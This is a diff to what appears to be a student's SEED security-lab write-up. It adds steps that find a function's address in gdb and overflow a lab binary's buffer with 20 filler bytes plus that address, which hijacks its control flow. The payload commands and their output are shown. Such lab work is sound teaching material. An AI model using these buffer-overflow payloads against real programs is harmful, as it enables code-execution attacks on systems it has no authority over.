@@ -107,3 +107,24 @@ seed@ac432deba69f:~/seclabs$ ./pattern.out $(python -c "print('a'*16 + '\x62\x42
 ```
 **result:**  
 Correct pattern
+
+# flow
+
+step1 and step2 similar bof1
+
+step3:
+```bash
+gdb-peda$ disas change
+```
+
+step4:
+```bash
+save address change: 0x0804843b
+```
+step5:
+```bash
+seed@5528c08120d5:~/seclabs$ ./flow.out $(python -c "print('a'*20 + '\x3b\x84\x04\x08')")
+```
+**result:**  
+code flow has been modified  
+Segmentation fault
